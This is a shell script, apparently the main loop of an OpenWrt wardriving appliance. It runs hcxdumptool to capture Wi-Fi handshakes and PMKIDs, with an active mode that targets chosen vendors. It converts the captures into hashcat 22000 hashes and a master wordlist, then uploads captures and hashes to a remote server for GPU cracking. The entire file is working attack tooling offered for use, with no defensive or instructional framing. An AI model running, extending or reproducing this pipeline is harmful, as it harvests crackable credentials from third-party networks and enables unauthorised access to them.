#!/bin/sh

# ===== SIGNAL TRAP FOR CLEAN SHUTDOWN =====
cleanup() {
    echo "[!] Caught signal - cleaning up..."
    jobs -p | while read -r pid; do
        [ -n "$pid" ] && kill -15 "$pid" 2>/dev/null
    done
    rm -f /var/run/wardriving_core.pid
    exit 0
}
trap cleanup SIGTERM SIGINT SIGHUP

LIB_DIR="${WARDRIVING_LIB_DIR:-/usr/lib/wardriving}"
CLIENTS_BIN="${WARDRIVING_CLIENTS_BIN:-/usr/bin/wardriving_clients.sh}"
# shellcheck disable=SC1091 # Runtime path is provided by the OpenWrt installer.
. "$LIB_DIR/db.sh"
# shellcheck disable=SC1091 # Runtime path is provided by the OpenWrt installer.
. "$LIB_DIR/remote.sh"

# Start virtual GPS server if it doesn't exist
pkill -f "socat.*vGPS" 2>/dev/null
rm -f /tmp/vGPS_fifo
mkfifo /tmp/vGPS_fifo
socat pty,link=/tmp/vGPS,raw,echo=0 pipe:/tmp/vGPS_fifo &

# Función para parpadear un LED si existe (feedback visual)
blink_led() {
    # Intenta encontrar un LED que probablemente sea seguro usar
    _LED=$(ls /sys/class/leds/ 2>/dev/null | grep -iE "usb" | head -n 1)
    [ -z "$_LED" ] && _LED=$(ls /sys/class/leds/ 2>/dev/null | grep -iE "wps|wlan|wifi|system|power" | head -n 1)
    if [ -n "$_LED" ] && [ -f "/sys/class/leds/$_LED/brightness" ]; then
        _current=$(cat "/sys/class/leds/$_LED/brightness")
        echo 0 > "/sys/class/leds/$_LED/brightness"
        usleep 100000 2>/dev/null || sleep 1
        echo 255 > "/sys/class/leds/$_LED/brightness" 2>/dev/null || echo 1 > "/sys/class/leds/$_LED/brightness"
        usleep 100000 2>/dev/null || sleep 1
        echo "$_current" > "/sys/class/leds/$_LED/brightness"
    fi
}

merge_hash_file() {
    _hash_file="$1"
    [ -s "$_hash_file" ] || return 0
    blink_led
    cat "$_hash_file" >> /mnt/wardriving/master.hc2200
    nice -n 10 sort -u /mnt/wardriving/master.hc2200 -o /mnt/wardriving/master.hc2200
}

merge_essid_file() {
    _essid_file="$1"
    [ -s "$_essid_file" ] || return 0
    cat "$_essid_file" >> /mnt/wardriving/master_essid.txt
    sort -u /mnt/wardriving/master_essid.txt -o /mnt/wardriving/master_essid.txt
}

local_extract_capture() {
    _pcap="$1"
    _hc2200="$2"
    _essid="$3"
    _csv="$4"
    _db="$5"

    echo "[*] Extracting $_pcap locally to $_hc2200"
    nice -n 10 hcxpcapngtool -o "$_hc2200" -E "$_essid" --csv="$_csv" "$_pcap" > /dev/null 2>&1
    "$CLIENTS_BIN" "$_pcap" "$_csv" "$_db" 2>/dev/null || true
    db_insert_hcx_csv "$_csv" "$_db"
    merge_hash_file "$_hc2200"
    merge_essid_file "$_essid"
    rm -f "$_hc2200" "$_essid" "$_csv"
}

import_remote_bundle() {
    _bundle="$1"
    _workdir=$(mktemp -d /tmp/wardriving_extract_XXXXXX) || return 1
    if ! tar -xzf "$_bundle" -C "$_workdir" >/dev/null 2>&1; then
        rm -rf "$_workdir"
        return 1
    fi
    if [ ! -f "$_workdir/networks.jsonl" ] && [ ! -f "$_workdir/clients.jsonl" ] && [ ! -f "$_workdir/capture.hc2200" ]; then
        rm -rf "$_workdir"
        return 1
    fi

    db_insert_jsonl_rows "$_workdir/networks.jsonl" /mnt/wardriving/wardriving.db
    db_insert_clients_jsonl "$_workdir/clients.jsonl" /mnt/wardriving/wardriving.db
    merge_hash_file "$_workdir/capture.hc2200"
    rm -rf "$_workdir"
}

try_remote_extract_capture() {
    _pcap="$1"
    _bundle="$2"

    [ "$EXTRACTION_MODE" = "remote" ] || return 1
    if [ -z "$REMOTE_URL" ]; then
        remote_write_status "unconfigured" "0" "missing remote url"
        return 1
    fi

    echo "[*] Requesting remote extraction for $_pcap ($REMOTE_URL) ..."
    remote_write_status "uploading" "0" "sending capture for extraction"
    HTTP_CODE=$(remote_extract_capture "$_pcap" "$_bundle")
    if [ "$HTTP_CODE" != "200" ]; then
        echo "[-] Remote extraction failed (Code: $HTTP_CODE). Falling back to local extraction..."
        remote_write_status "fallback" "$HTTP_CODE" "remote extraction failed"
        rm -f "$_bundle"
        return 1
    fi

    if import_remote_bundle "$_bundle"; then
        echo "[+] Remote extraction bundle imported locally."
        remote_write_status "extracted" "$HTTP_CODE" "remote bundle imported"
        rm -f "$_bundle"
        return 0
    fi

    echo "[-] Remote extraction bundle was invalid. Falling back to local extraction..."
    remote_write_status "fallback" "$HTTP_CODE" "invalid extraction bundle"
    rm -f "$_bundle"
    return 1
}

USB_FULL_COUNT=0
while true; do

    if ! mount | grep -q "/mnt/wardriving"; then
        echo "ERROR: USB NOT DETECTED"
        exit 1
    fi
    
    USB_PCT=$(df /mnt/wardriving | awk 'NR==2 {print $5}' | tr -d '%')
    if [ "$USB_PCT" -ge 95 ]; then
        USB_FULL_COUNT=$((USB_FULL_COUNT + 1))
        echo "ERROR: USB CAPACITY CRITICAL ($USB_PCT%). Count: $USB_FULL_COUNT" >> /tmp/wardriving_status.log
        blink_led
        # Auto-stop after ~5 minutes of persistent fullness (30 cycles * 10s avg)
        if [ "$USB_FULL_COUNT" -gt 30 ]; then
            echo "FATAL: USB full for too long. Stopping wardriving." >> /tmp/wardriving_status.log
            /etc/init.d/wardriving stop 2>/dev/null
            exit 1
        fi
        # Exponential backoff: 5s, 10s, 20s, 40s... capped at 300s
        BACKOFF=$(( 5 * (1 << (USB_FULL_COUNT < 6 ? USB_FULL_COUNT : 6)) ))
        [ "$BACKOFF" -gt 300 ] && BACKOFF=300
        sleep "$BACKOFF"
        continue
    fi
    USB_FULL_COUNT=0  # Reset counter when USB has space again


    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    FILENAME="/mnt/wardriving/wardriving_${TIMESTAMP}.pcapng"
    NMEAFILE="/mnt/wardriving/wardriving_${TIMESTAMP}.nmea"
    HC2200FILE="/mnt/wardriving/wardriving_${TIMESTAMP}.hc2200"
    TMP_ESSID="/tmp/essid_${TIMESTAMP}.txt"
    TMP_CSV="/tmp/csv_${TIMESTAMP}.txt"
    REMOTE_BUNDLE="/tmp/extract_bundle_${TIMESTAMP}.tar.gz"
    
    echo "[*] Starting session: $FILENAME"
        OPTS=""
    if [ -f /etc/wardriving_mode.txt ]; then
        MODE=$(cat /etc/wardriving_mode.txt)
        if [ "$MODE" = "passive" ]; then
            OPTS="--attemptapmax=0"
            echo "[*] MODE: PASSIVE (Silent Site Survey)"
        elif [ "$MODE" = "smart" ]; then
            if [ -s /etc/wardriving_targets.txt ]; then
                # format targets for hcxdumptool: 112233
                cat /etc/wardriving_targets.txt | sed 's/://g' > /tmp/smart_targets.txt
                OPTS="--filterlist_ap=/tmp/smart_targets.txt --filtermode=2"
                echo "[*] MODE: SMART TARGETING (Attacking only targeted OUIs)"
            else
                echo "[*] MODE: SMART TARGETING (No targets defined, defaulting to PASSIVE)"
                OPTS="--attemptapmax=0"
            fi
        fi
    fi

    # shellcheck disable=SC2086 # OPTS needs word splitting for multi-flag modes
    hcxdumptool -i wlan0mon -w "$FILENAME" --nmea_dev=/tmp/vGPS --nmea_pcapng --nmea_out="$NMEAFILE" -F -t 3 --tot=1 $OPTS
    
    if [ -f "$FILENAME" ]; then
        remote_read_config
        if try_remote_extract_capture "$FILENAME" "$REMOTE_BUNDLE"; then
            :
        else
            local_extract_capture "$FILENAME" "$HC2200FILE" "$TMP_ESSID" "$TMP_CSV" /mnt/wardriving/wardriving.db
            if [ "$EXTRACTION_MODE" = "local" ]; then
                if [ "$GPU_CRACKING_ENABLED" = "1" ]; then
                    if [ -n "$REMOTE_URL" ]; then
                        remote_write_status "local" "0" "local extraction complete"
                        remote_sync_hashes "/mnt/wardriving/master.hc2200" || true
                    else
                        remote_write_status "unconfigured" "0" "missing remote url"
                    fi
                else
                    remote_write_status "local" "0" "local extraction gpu cracking off"
                fi
            elif [ "$GPU_CRACKING_ENABLED" = "1" ] && [ -n "$REMOTE_URL" ]; then
                remote_sync_hashes "/mnt/wardriving/master.hc2200" || true
            fi
        fi
        
        # Retencion configurable del pcapng
        if [ ! -f /etc/wardriving_keep_pcap.txt ]; then
            rm -f "$FILENAME" "$NMEAFILE"
        fi
    fi

    # Truncate log only when it grows excessively (avoid unnecessary I/O)
    LOG_SIZE=$(wc -l < /tmp/wardriving_status.log 2>/dev/null || echo 0)
    if [ "$LOG_SIZE" -gt 3000 ]; then
        tail -n 2000 /tmp/wardriving_status.log > /tmp/wardriving_status.tmp 2>/dev/null && mv /tmp/wardriving_status.tmp /tmp/wardriving_status.log
    fi

    sync
    sleep 2
done
